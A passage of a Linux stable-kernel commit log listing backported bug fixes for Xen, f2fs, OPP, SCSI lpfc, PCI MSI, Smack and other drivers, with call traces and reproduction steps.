("xenbus\_client: Extend interface to support multi-page ring").
In this commit pointer to location of where the shared page address
is stored was being passed to the xenbus\_grant\_ring() function rather
then the address of the shared page itself. This resulted in a situation
where the driver would attach to the vtpm-stubdom but any attempt
to send a command to the stub domain would timeout.
A diagnostic finding for this regression is the following error
message being generated when the xen-tpmfront driver probes for a
device:
<3>vtpm vtpm-0: tpm\_transmit: tpm\_send: error -62
<3>vtpm vtpm-0: A TPM error (-62) occurred attempting to determine
the timeouts
This fix is relevant to all kernels from 4.1 forward which is the
release in which multi-page xenbus support was introduced.
Daniel De Graaf formulated the fix by code inspection after the
regression point was located.
Fixes: ccc9d90a9a8b ("xenbus\_client: Extend interface to support multi-page ring")
Signed-off-by: Dr. Greg Wettstein
Signed-off-by: Greg Kroah-Hartman
[boris: Updated commit message, added Fixes tag]
Signed-off-by: Boris Ostrovsky
Cc: stable@vger.kernel.org # v4.1+
Reviewed-by: Jarkko Sakkinen
Signed-off-by: Jarkko Sakkinen
commit 2c400cb65dc4ec8c4a3fb99231536f9516ec2a0e
Author: Joe Jin
Date: Tue Oct 16 15:21:16 2018 -0700
xen-swiotlb: use actually allocated size on check physical continuous
commit 7250f422da0480d8512b756640f131b9b893ccda upstream.
xen\_swiotlb\_{alloc,free}\_coherent() allocate/free memory based on the
order of the pages and not size argument (bytes). This is inconsistent with
range\_straddles\_page\_boundary and memset which use the 'size' value,
which may lead to not exchanging memory with Xen (range\_straddles\_page\_boundary()
returned true). And then the call to xen\_swiotlb\_free\_coherent() would
actually try to exchange the memory with Xen, leading to the kernel
hitting an BUG (as the hypercall returned an error).
This patch fixes it by making the 'size' variable be of the same size
as the amount of memory allocated.
CC: stable@vger.kernel.org
Signed-off-by: Joe Jin
Cc: Konrad Rzeszutek Wilk
Cc: Boris Ostrovsky
Cc: Christoph Helwig
Cc: Dongli Zhang
Cc: John Sobecki
Signed-off-by: Konrad Rzeszutek Wilk
Signed-off-by: Greg Kroah-Hartman
commit 884f8f6e1b41c5828b73b9b545b4570737624618
Author: Marek Szyprowski
Date: Tue Aug 7 12:48:49 2018 +0200
ARM: dts: exynos: Mark 1 GHz CPU OPP as suspend OPP on Exynos5250
commit 645b23da6f8b47f295fa87051335d41d139717a5 upstream.
1 GHz CPU OPP is the default boot value for the Exynos5250 SOC, so mark it
as suspend OPP. This fixes suspend/resume on Samsung Exynos5250 Snow
Chomebook, which was broken since switching to generic cpufreq-dt driver
in v4.3.
Cc:  # 4.3.x: cd6f55457eb4: ARM: dts: exynos: Remove "cooling-{min|max}-level" for CPU nodes
Cc:  # 4.3.x: 672f33198bee: arm: dts: exynos: Add missing cooling device properties for CPUs
Cc:  # 4.3.x
Signed-off-by: Marek Szyprowski
Reviewed-by: Chanwoo Choi
Acked-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit feb08c3f3916793edaf8e2f4295d0489cec817a7
Author: Marek Szyprowski
Date: Tue Aug 7 12:48:48 2018 +0200
ARM: dts: exynos: Convert exynos5250.dtsi to opp-v2 bindings
commit eb9e16d8573e243f8175647f851eb5085dbe97a4 upstream.
Convert Exynos5250 to OPP-v2 bindings. This is a preparation to add proper
support for suspend operation point, which cannot be marked in opp-v1.
Cc:  # 4.3.x: cd6f55457eb4: ARM: dts: exynos: Remove "cooling-{min|max}-level" for CPU nodes
Cc:  # 4.3.x: 672f33198bee: arm: dts: exynos: Add missing cooling device properties for CPUs
Cc:  # 4.3.x
Signed-off-by: Marek Szyprowski
Reviewed-by: Chanwoo Choi
Acked-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit 4d5dd7609a88fa427d9f1a46a7d0b3239b583b67
Author: Viresh Kumar
Date: Fri May 25 16:01:53 2018 +0530
arm: dts: exynos: Add missing cooling device properties for CPUs
commit 672f33198bee21ee91e6af2cb8f67cfc8bc97ec1 upstream.
The cooling device properties, like "#cooling-cells" and
"dynamic-power-coefficient", should either be present for all the CPUs
of a cluster or none. If these are present only for a subset of CPUs of
a cluster then things will start falling apart as soon as the CPUs are
brought online in a different order. For example, this will happen
because the operating system looks for such properties in the CPU node
it is trying to bring up, so that it can register a cooling device.
Add such missing properties.
Fix other missing properties (clocks, OPP, clock latency) as well to
make it all work.
Signed-off-by: Viresh Kumar
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit e552bb9a21fdb26e21895019149b88ab940587a9
Author: Viresh Kumar
Date: Tue Sep 11 11:14:34 2018 +0530
OPP: Free OPP table properly on performance state irregularities
commit 2fbb8670b4ff4454f1c0de510f788d737edc4b90 upstream.
The OPP table was freed, but not the individual OPPs which is done from
\_dev\_pm\_opp\_remove\_table(). Fix it by calling \_dev\_pm\_opp\_remove\_table()
as well.
Cc: 4.18  # v4.18
Fixes: 3ba98324e81a ("PM / OPP: Get performance state using genpd helper")
Tested-by: Niklas Cassel
Signed-off-by: Viresh Kumar
Signed-off-by: Greg Kroah-Hartman
commit d07c6c4373001c0fe71d9176b470e3c5b30d39e9
Author: Chao Yu
Date: Mon Oct 22 09:12:51 2018 +0800
f2fs: fix to account IO correctly
commit 4c58ed076875f36dae0f240da1e25e99e5d4afb8 upstream.
Below race can cause reversed reference on dirty count, fix it by
relocating \_\_submit\_bio() and inc\_page\_count().
Thread A Thread B
- f2fs\_inplace\_write\_data
- f2fs\_submit\_page\_bio
- \_\_submit\_bio
- f2fs\_write\_end\_io
- dec\_page\_count
- inc\_page\_count
Cc:
Fixes: d1b3e72d5490 ("f2fs: submit bio of in-place-update pages")
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit 16eb8add5ee9bf0076be4d9bb51518a9d137c9d1
Author: Chao Yu
Date: Wed Oct 3 22:32:44 2018 +0800
f2fs: fix to recover cold bit of inode block during POR
commit ef2a007134b4eaa39264c885999f296577bc87d2 upstream.
Testcase to reproduce this bug:
1. mkfs.f2fs /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. sync
5. chattr +A /mnt/f2fs/file
6. xfs\_io -f /mnt/f2fs/file -c "fsync"
7. godown /mnt/f2fs
8. umount /mnt/f2fs
9. mount -t f2fs /dev/sdd /mnt/f2fs
10. chattr -A /mnt/f2fs/file
11. xfs\_io -f /mnt/f2fs/file -c "fsync"
12. umount /mnt/f2fs
13. mount -t f2fs /dev/sdd /mnt/f2fs
14. lsattr /mnt/f2fs/file
-----------------N- /mnt/f2fs/file
But actually, we expect the corrct result is:
-------A---------N- /mnt/f2fs/file
The reason is in step 9) we missed to recover cold bit flag in inode
block, so later, in fsync, we will skip write inode block due to below
condition check, result in lossing data in another SPOR.
f2fs\_fsync\_node\_pages()
if (!IS\_DNODE(page) || !is\_cold\_node(page))
continue;
Note that, I guess that some non-dir inode has already lost cold bit
during POR, so in order to reenable recovery for those inode, let's
try to recover cold bit in f2fs\_iget() to save more fsynced data.
Fixes: c56675750d7c ("f2fs: remove unneeded set\_cold\_node()")
Cc:  4.17+
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit e8683288c629a5d872329ede260a7457a16c88b7
Author: Jaegeuk Kim
Date: Tue Oct 16 19:30:13 2018 -0700
Revert "f2fs: fix to clear PG\_checked flag in set\_page\_dirty()"
commit 164a63fa6b384e30ceb96ed80bc7dc3379bc0960 upstream.
This reverts commit 66110abc4c931f879d70e83e1281f891699364bf.
If we clear the cold data flag out of the writeback flow, we can miscount
-1 by end\_io, which incurs a deadlock caused by all I/Os being blocked during
heavy GC.
Balancing F2FS Async:
- IO (CP: 1, Data: -1, Flush: ( 0 0 1), Discard: ( ...
GC thread: IRQ
- move\_data\_page()
- set\_page\_dirty()
- clear\_cold\_data()
- f2fs\_write\_end\_io()
- type = WB\_DATA\_TYPE(page);
here, we get wrong type
- dec\_page\_count(sbi, type);
- f2fs\_wait\_on\_page\_writeback()
Cc:
Reported-and-Tested-by: Park Ju Hyung
Reviewed-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit e602d368b00725fd5c5d2f873ecc04ff372ea144
Author: Prarit Bhargava
Date: Mon Oct 8 11:06:18 2018 -0400
cpupower: Fix AMD Family 0x17 msr\_pstate size
[ Upstream commit 8c22e2f695920ebd94f9a53bcf2a65eb36d4dba1 ]
The msr\_pstate data is only 63 bits long and should be 64 bits.
Add in the missing bit from res1 for AMD Family 0x17.
Reference: https://www.amd.com/system/files/TechDocs/54945\_PPR\_Family\_17h\_Models\_00h-0Fh.pdf, page 138.
Signed-off-by: Prarit Bhargava
Cc: Shuah Khan
Cc: Stafford Horne
Signed-off-by: Shuah Khan (Samsung OSG)
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1511aba3242982fa6a74d8b6841fe341857d9ed1
Author: Takashi Iwai
Date: Sat Aug 11 23:33:34 2018 +0200
ALSA: hda: Check the non-cached stream buffers more explicitly
[ Upstream commit 78c9be61c3a5cd9e2439fd27a5ffad73a81958c7 ]
Introduce a new flag, uc\_buffer, to indicate that the controller
requires the non-cached pages for stream buffers, either as a
chip-specific requirement or specified via snoop=0 option.
This improves the code-readability.
Also, this patch fixes the incorrect behavior for C-Media chip where
the stream buffers were never handled as non-cached due to the check
of driver\_type even if you pass snoop=0 option.
Signed-off-by: Takashi Iwai
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 050d782641c223a38ea01f9e9bb65e29934bdc21
Author: Vijay Immanuel
Date: Tue Jun 12 18:20:49 2018 -0700
IB/rxe: fix for duplicate request processing and ack psns
[ Upstream commit b97db58557f4aa6d9903f8e1deea6b3d1ed0ba43 ]
Don't reset the resp opcode for a replayed read response.
The resp opcode could be in the middle of a write or send
sequence, when the duplicate read request was received.
An example sequence is as follows:
- Receive read request for 12KB PSN 20. Transmit read response
first, middle and last with PSNs 20,21,22.
- Receive write first PSN 23.
At this point the resp psn is 24 and resp opcode is write first.
- The sender notices that PSN 20 is dropped and retransmits.
Receive read request for 12KB PSN 20. Transmit read response
first, middle and last with PSNs 20,21,22. The resp opcode is
set to -1, the resp psn remains 24.
- Receive write first PSN 23. This is processed by duplicate\_request().
The resp opcode remains -1 and resp psn remains 24.
- Receive write middle PSN 24. check\_op\_seq() reports a missing
first error since the resp opcode is -1.
When sending an ack for a duplicate send or write request,
use the psn of the previous ack sent. Do not use the psn
of a read response for the ack.
An example sequence is as follows:
- Receive write PSN 30. Transmit ACK for PSN 30.
- Receive read request 4KB PSN 31. Transmit read response with
PSN 31. The resp psn is now 32.
- The sender notices that PSN 30 is dropped and retransmits.
Receive write PSN 30. duplicate\_request() sends an ACK with
PSN 31. That is incorrect since PSN 31 was a read request.
Signed-off-by: Vijay Immanuel
Signed-off-by: Doug Ledford
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8efbd111471eb369db264c31d0c31685c5dce699
Author: Paul Cercueil
Date: Wed Aug 29 23:32:44 2018 +0200
dmaengine: dma-jz4780: Return error if not probed from DT
[ Upstream commit 54f919a04cf221bc1601d1193682d4379dacacbd ]
The driver calls clk\_get() with the clock name set to NULL, which means
that the driver could only work when probed from devicetree. From now
on, we explicitly require the driver to be probed from devicetree.
Signed-off-by: Paul Cercueil
Tested-by: Mathieu Malaterre
Signed-off-by: Vinod Koul
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit faef9773f48a87c785cfd3edb8f69e30406b5ef1
Author: Alexandre Belloni
Date: Sun Sep 9 22:48:58 2018 +0200
mfd: menelaus: Fix possible race condition and leak
[ Upstream commit 9612f8f503804d2fd2f63aa6ba1e58bba4612d96 ]
The IRQ work is added before the struct rtc is allocated and registered,
but this struct is used in the IRQ handler. This may lead to a NULL pointer
dereference.
Switch to devm\_rtc\_allocate\_device/rtc\_register\_device to allocate the rtc
before calling menelaus\_add\_irq\_work.
Also, this solves a possible leak as the RTC is never released.
Signed-off-by: Alexandre Belloni
Signed-off-by: Lee Jones
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2dc063e47362208f4b8386ae610dbacb0fcd60a3
Author: Eric W. Biederman
Date: Mon Sep 3 20:02:46 2018 +0200
signal: Always deliver the kernel's SIGKILL and SIGSTOP to a pid namespace init
[ Upstream commit 3597dfe01d12f570bc739da67f857fd222a3ea66 ]
Instead of playing whack-a-mole and changing SEND\_SIG\_PRIV to
SEND\_SIG\_FORCED throughout the kernel to ensure a pid namespace init
gets signals sent by the kernel, stop allowing a pid namespace init to
ignore SIGKILL or SIGSTOP sent by the kernel. A pid namespace init is
only supposed to be able to ignore signals sent from itself and
children with SIG\_DFL.
Fixes: 921cf9f63089 ("signals: protect cinit from unblocked SIG\_DFL signals")
Reviewed-by: Thomas Gleixner
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6d5b9f9d3ec392b6e7c9aaa4c3b172ba3a19634e
Author: Yunlei He
Date: Tue Jun 26 13:12:43 2018 +0800
f2fs: report error if quota off error during umount
[ Upstream commit cda9cc595f0bb6ffa51a4efc4b6533dfa4039b4c ]
Now, we depend on fsck to ensure quota file data is ok,
so we scan whole partition if checkpoint without umount
flag. It's same for quota off error case, which may make
quota file data inconsistent.
generic/019 reports below error:
\_\_quota\_error: 1160 callbacks suppressed
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
Quota error (device zram1): write\_blk: dquota write failed
Quota error (device zram1): qtree\_write\_dquot: Error -28 occurred while creating quota
VFS: Busy inodes after unmount of zram1. Self-destruct in 5 seconds. Have a nice day...
If we failed in below path due to fail to write dquot block, we will miss
to release quota inode, fix it.
- f2fs\_put\_super
- f2fs\_quota\_off\_umount
- f2fs\_quota\_off
- f2fs\_quota\_sync <-- failed
- dquot\_quota\_off <-- missed to call
Signed-off-by: Yunlei He
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b41c30c5acc9ab771d1ee93ab67c57f7f5bde529
Author: Zhikang Zhang
Date: Mon Sep 10 16:18:25 2018 +0800
f2fs: avoid sleeping under spin\_lock
[ Upstream commit b430f7263673eab1dc40e662ae3441a9619d16b8 ]
In the call trace below, we might sleep in function dput().
So in order to avoid sleeping under spin\_lock, we remove f2fs\_mark\_inode\_dirty\_sync
from \_\_try\_update\_largest\_extent && \_\_drop\_largest\_extent.
BUG: sleeping function called from invalid context at fs/dcache.c:796
Call trace:
dump\_backtrace+0x0/0x3f4
show\_stack+0x24/0x30
dump\_stack+0xe0/0x138
\_\_\_might\_sleep+0x2a8/0x2c8
\_\_might\_sleep+0x78/0x10c
dput+0x7c/0x750
block\_dump\_\_\_mark\_inode\_dirty+0x120/0x17c
\_\_mark\_inode\_dirty+0x344/0x11f0
f2fs\_mark\_inode\_dirty\_sync+0x40/0x50
\_\_insert\_extent\_tree+0x2e0/0x2f4
f2fs\_update\_extent\_tree\_range+0xcf4/0xde8
f2fs\_update\_extent\_cache+0x114/0x12c
f2fs\_update\_data\_blkaddr+0x40/0x50
write\_data\_page+0x150/0x314
do\_write\_data\_page+0x648/0x2318
\_\_write\_data\_page+0xdb4/0x1640
f2fs\_write\_cache\_pages+0x768/0xafc
\_\_f2fs\_write\_data\_pages+0x590/0x1218
f2fs\_write\_data\_pages+0x64/0x74
do\_writepages+0x74/0xe4
\_\_writeback\_single\_inode+0xdc/0x15f0
writeback\_sb\_inodes+0x574/0xc98
\_\_writeback\_inodes\_wb+0x190/0x204
wb\_writeback+0x730/0xf14
wb\_check\_old\_data\_flush+0x1bc/0x1c8
wb\_workfn+0x554/0xf74
process\_one\_work+0x440/0x118c
worker\_thread+0xac/0x974
kthread+0x1a0/0x1c8
ret\_from\_fork+0x10/0x1c
Signed-off-by: Zhikang Zhang
Reviewed-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ec8eb8b5705796b019247035b64f5f71844fbceb
Author: James Smart
Date: Mon Sep 10 10:30:44 2018 -0700
scsi: lpfc: Correct race with abort on completion path
[ Upstream commit ca7fb76e091f889cfda1287c07a9358f73832b39 ]
On io completion, the driver is taking an adapter wide lock and nulling the
scsi command back pointer. The nulling of the back pointer is to signify the
io was completed and the scsi\_done() routine was called. However, the routine
makes no check to see if the abort routine had done the same thing and
possibly nulled the pointer. Thus it may doubly-complete the io.
Make the following mods:
- Check to make sure forward progress (call scsi\_done()) only happens if the
command pointer was non-null.
- As the taking of the lock, which is adapter wide, is very costly on a system
under load, null the pointer using an xchg operation rather than under lock.
Signed-off-by: Dick Kennedy
Signed-off-by: James Smart
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 051b5fa2890be7be506b2e40a0258cc7544962fd
Author: James Smart
Date: Mon Sep 10 10:30:45 2018 -0700
scsi: lpfc: Correct soft lockup when running mds diagnostics
[ Upstream commit 0ef01a2d95fd62bb4f536e7ce4d5e8e74b97a244 ]
When running an mds diagnostic that passes frames with the switch, soft
lockups are detected. The driver is in a CQE processing loop and has
sufficient amount of traffic that it never exits the ring processing routine,
thus the "lockup".
Cap the number of elements in the work processing routine to 64 elements. This
ensures that the cpu will be given up and the handler reschedule to process
additional items.
Signed-off-by: Dick Kennedy
Signed-off-by: James Smart
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e30cf6a23808c61396583e99d293e5080f6c4250
Author: Alexandre Belloni
Date: Thu Aug 16 09:39:41 2018 +0200
uio: ensure class is registered before devices
[ Upstream commit ae61cf5b9913027c6953a79ed3894da4f47061bd ]
When both uio and the uio drivers are built in the kernel, it is possible
for a driver to register devices before the uio class is registered.
This may result in a NULL pointer dereference later on in
get\_device\_parent() when accessing the class glue\_dirs spinlock.
The trace looks like that:
Unable to handle kernel NULL pointer dereference at virtual address 00000140
[...]
[] \_raw\_spin\_lock+0x14/0x48
[] device\_add+0x154/0x6a0
[] device\_create\_groups\_vargs+0x120/0x128
[] device\_create+0x54/0x60
[] \_\_uio\_register\_device+0x120/0x4a8
[] jaguar2\_pci\_probe+0x2d4/0x558
[] local\_pci\_probe+0x3c/0xb8
[] pci\_device\_probe+0x11c/0x180
[] driver\_probe\_device+0x22c/0x2d8
[] \_\_driver\_attach+0xbc/0xc0
[] bus\_for\_each\_dev+0x4c/0x98
[] driver\_attach+0x20/0x28
[] bus\_add\_driver+0x1b8/0x228
[] driver\_register+0x60/0xf8
[] \_\_pci\_register\_driver+0x40/0x48
Return EPROBE\_DEFER in that case so the driver can register the device
later.
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6a5975e8383c6c3c3c223a7cb6f3b980a2411240
Author: Moni Shoua
Date: Wed Sep 12 09:33:55 2018 +0300
IB/mlx5: Allow transition of DCI QP to reset
[ Upstream commit 99ed748e878a99c6c7b87bbec063eefd9e47cb42 ]
The transition is allowed from any state and the atrribute mask must be
IB\_QP\_STATE.
Fixes: c32a4f296e1d ("IB/mlx5: Add support for DC Initiator QP")
Signed-off-by: Moni Shoua
Reviewed-by: Artemy Kovalyov
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 12142fb13d30937059cd6676c316ab3041bf328a
Author: Stephen Boyd
Date: Wed Aug 15 13:37:04 2018 -0700
firmware: coreboot: Unmap ioregion after device population
[ Upstream commit 20edec388277b62ddfddb8b2b376a937a2cd6d1b ]
Both callers of coreboot\_table\_init() ioremap the pointer that comes in
but they don't unmap the memory on failure. Both of them also fail probe
immediately with the return value of coreboot\_table\_init(), leaking a
mapping when it fails. The mapping isn't necessary at all after devices
are populated either, so we can just drop the mapping here when we exit
the function. Let's do that to simplify the code a bit and plug the leak.
Cc: Wei-Ning Huang
Cc: Julius Werner
Cc: Brian Norris
Cc: Samuel Holland
Fixes: 570d30c2823f ("firmware: coreboot: Expose the coreboot table as a bus")
Signed-off-by: Stephen Boyd
Reviewed-by: Julius Werner
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0470ae4236d0e273ae81e368eccd8d4d403c86ff
Author: Waiman Long
Date: Fri Sep 14 14:53:32 2018 -0400
driver/dma/ioat: Call del\_timer\_sync() without holding prep\_lock
[ Upstream commit cfb03be6c7e8a1591285849c361d67b09f5149f7 ]
The following lockdep splat was observed:
[ 1222.241750] ======================================================
[ 1222.271301] WARNING: possible circular locking dependency detected
[ 1222.301060] 4.16.0-10.el8+5.x86\_64+debug #1 Not tainted
[ 1222.326659] ------------------------------------------------------
[ 1222.356565] systemd-shutdow/1 is trying to acquire lock:
[ 1222.382660] ((&ioat\_chan->timer)){+.-.}, at: [<00000000f71e1a28>] del\_timer\_sync+0x5/0xf0
[ 1222.422928]
[ 1222.422928] but task is already holding lock:
[ 1222.451743] (&(&ioat\_chan->prep\_lock)->rlock){+.-.}, at: [<000000008ea98b12>] ioat\_shutdown+0x86/0x100 [ioatdma]
:
[ 1223.524987] Chain exists of:
[ 1223.524987] (&ioat\_chan->timer) --> &(&ioat\_chan->cleanup\_lock)->rlock --> &(&ioat\_chan->prep\_lock)->rlock
[ 1223.524987]
[ 1223.594082] Possible unsafe locking scenario:
[ 1223.594082]
[ 1223.622630] CPU0 CPU1
[ 1223.645080] ---- ----
[ 1223.667404] lock(&(&ioat\_chan->prep\_lock)->rlock);
[ 1223.691535] lock(&(&ioat\_chan->cleanup\_lock)->rlock);
[ 1223.728657] lock(&(&ioat\_chan->prep\_lock)->rlock);
[ 1223.765122] lock((&ioat\_chan->timer));
[ 1223.784095]
[ 1223.784095] \*\*\* DEADLOCK \*\*\*
[ 1223.784095]
[ 1223.813492] 4 locks held by systemd-shutdow/1:
[ 1223.834677] #0: (reboot\_mutex){+.+.}, at: [<0000000056d33456>] SYSC\_reboot+0x10f/0x300
[ 1223.873310] #1: (&dev->mutex){....}, at: [<00000000258dfdd7>] device\_shutdown+0x1c8/0x660
[ 1223.913604] #2: (&dev->mutex){....}, at: [<0000000068331147>] device\_shutdown+0x1d6/0x660
[ 1223.954000] #3: (&(&ioat\_chan->prep\_lock)->rlock){+.-.}, at: [<000000008ea98b12>] ioat\_shutdown+0x86/0x100 [ioatdma]
In the ioat\_shutdown() function:
spin\_lock\_bh(&ioat\_chan->prep\_lock);
set\_bit(IOAT\_CHAN\_DOWN, &ioat\_chan->state);
del\_timer\_sync(&ioat\_chan->timer);
spin\_unlock\_bh(&ioat\_chan->prep\_lock);
According to the synchronization rule for the del\_timer\_sync() function,
the caller must not hold locks which would prevent completion of the
timer's handler.
The timer structure has its own lock that manages its synchronization.
Setting the IOAT\_CHAN\_DOWN bit should prevent other CPUs from
trying to use that device anyway, there is probably no need to call
del\_timer\_sync() while holding the prep\_lock. So the del\_timer\_sync()
call is now moved outside of the prep\_lock critical section to prevent
the circular lock dependency.
Signed-off-by: Waiman Long
Reviewed-by: Dave Jiang
Signed-off-by: Vinod Koul
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fbb33dd581b369d3bbbd68c7c7503e4a6df1e7e2
Author: Casey Schaufler
Date: Tue Sep 18 16:09:16 2018 -0700
Smack: ptrace capability use fixes
[ Upstream commit dcb569cf6ac99ca899b8109c128b6ae52477a015 ]
This fixes a pair of problems in the Smack ptrace checks
related to checking capabilities. In both cases, as reported
by Lukasz Pawelczyk, the raw capability calls are used rather
than the Smack wrapper that check addition restrictions.
In one case, as reported by Jann Horn, the wrong task is being
checked for capabilities.
Signed-off-by: Casey Schaufler
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6ae6cf2975fe69f6ae13f12d5365c21472a6f117
Author: Loic Poulain
Date: Tue Sep 4 17:18:57 2018 +0200
usb: chipidea: Prevent unbalanced IRQ disable
[ Upstream commit 8b97d73c4d72a2abf58f8e49062a7ee1e5f1334e ]
The ChipIdea IRQ is disabled before scheduling the otg work and
re-enabled on otg work completion. However if the job is already
scheduled we have to undo the effect of disable\_irq int order to
balance the IRQ disable-depth value.
Fixes: be6b0c1bd0be ("usb: chipidea: using one inline function to cover queue work operations")
Signed-off-by: Loic Poulain
Signed-off-by: Peter Chen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c4b86b1461f06cedcf4f163a3255a97ded5e5ab9
Author: Horia Geantă
Date: Wed Sep 12 11:59:30 2018 +0300
crypto: caam - fix implicit casts in endianness helpers
[ Upstream commit aae733a3f46f5ef338fbdde26e14cbb205a23de0 ]
Fix the following sparse endianness warnings:
drivers/crypto/caam/regs.h:95:1: sparse: incorrect type in return expression (different base types) @@ expected unsigned int @@ got restricted \_\_le32unsigned int @@
drivers/crypto/caam/regs.h:95:1: expected unsigned int
drivers/crypto/caam/regs.h:95:1: got restricted \_\_le32 [usertype]
drivers/crypto/caam/regs.h:95:1: sparse: incorrect type in return expression (different base types) @@ expected unsigned int @@ got restricted \_\_be32unsigned int @@
drivers/crypto/caam/regs.h:95:1: expected unsigned int
drivers/crypto/caam/regs.h:95:1: got restricted \_\_be32 [usertype]
drivers/crypto/caam/regs.h:92:1: sparse: cast to restricted \_\_le32
drivers/crypto/caam/regs.h:92:1: sparse: cast to restricted \_\_be32
Fixes: 261ea058f016 ("crypto: caam - handle core endianness != caam endianness")
Reported-by: kbuild test robot
Signed-off-by: Horia Geantă
Signed-off-by: Herbert Xu
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d7f59eb8ae0d69a739ff3d36d835db7d2fa1ead6
Author: Vignesh R
Date: Tue Sep 25 14:00:24 2018 +0530
PCI: dwc: pci-dra7xx: Enable errata i870 for both EP and RC mode
[ Upstream commit 726d75a6d243bf6730da3216f3592503f6f0f588 ]
Errata i870 is applicable in both EP and RC mode. Therefore rename
function dra7xx\_pcie\_ep\_unaligned\_memaccess(), that implements errata
workaround, to dra7xx\_pcie\_unaligned\_memaccess() and call it for both RC
and EP. Make sure driver probe does not fail in case the workaround is not
applied for RC mode in order to maintain DT backward compatibility.
Reported-by: Chris Welch
Signed-off-by: Vignesh R
[lorenzo.pieralisi@arm.com: reworded the log]
Signed-off-by: Lorenzo Pieralisi
Acked-by: Kishon Vijay Abraham I
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0cf50920c081a9771bc0b36119fe1defcbc543a9
Author: Suzuki K Poulose
Date: Thu Sep 20 13:17:46 2018 -0600
coresight: etb10: Fix handling of perf mode
[ Upstream commit 987d1e8dcd370d96029a3d76a0031b043c4a69ae ]
If the ETB is already enabled in sysfs mode, the ETB reports
success even if a perf mode is requested. Fix this by checking
the requested mode.
Cc: Mathieu Poirier
Signed-off-by: Suzuki K Poulose
Signed-off-by: Mathieu Poirier
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c259506c8a79810a981c37343f66aaf72391a135
Author: Tonghao Zhang
Date: Mon Sep 24 07:00:41 2018 -0700
PCI/MSI: Warn and return error if driver enables MSI/MSI-X twice
[ Upstream commit 4c1ef72e9b71a19fb405ebfcd37c0a5e16fa44ca ]
It is a serious driver defect to enable MSI or MSI-X more than once. Doing
so may panic the kernel as in the stack trace below:
Call Trace:
sysfs\_add\_one+0xa5/0xd0
create\_dir+0x7c/0xe0
sysfs\_create\_subdir+0x1c/0x20
internal\_create\_group+0x6d/0x290
sysfs\_create\_groups+0x4a/0xa0
populate\_msi\_sysfs+0x1cd/0x210
pci\_enable\_msix+0x31c/0x3e0
igbuio\_pci\_open+0x72/0x300 [igb\_uio]
uio\_open+0xcc/0x120 [uio]
chrdev\_open+0xa1/0x1e0
[...]
do\_sys\_open+0xf3/0x1f0
SyS\_open+0x1e/0x20
system\_call\_fastpath+0x16/0x1b
---[ end trace 11042e2848880209 ]---
Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ffffffffa056b4fa
We want to keep the WARN\_ON() and stack trace so the driver can be fixed,
but we can avoid the kernel panic by returning an error. We may still get
warnings like this:
Call Trace:
pci\_enable\_msix+0x3c9/0x3e0
igbuio\_pci\_open+0x72/0x300 [igb\_uio]
uio\_open+0xcc/0x120 [uio]
chrdev\_open+0xa1/0x1e0
[...]
do\_sys\_open+0xf3/0x1f0
SyS\_open+0x1e/0x20
system\_call\_fastpath+0x16/0x1b
------------[ cut here ]------------
WARNING: at fs/sysfs/dir.c:526 sysfs\_add\_one+0xa5/0xd0()
sysfs: cannot create duplicate filename '/devices/pci0000:00/0000:00:03.0/0000:01:00.1/msi\_irqs'
Signed-off-by: Tonghao Zhang
[bhelgaas: changelog, fix patch whitespace, remove !!]
Signed-off-by: Bjorn Helgaas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 14bbbe74bc3ef3e58109e88bf8c0abe7cb021921
Author: Chao Yu
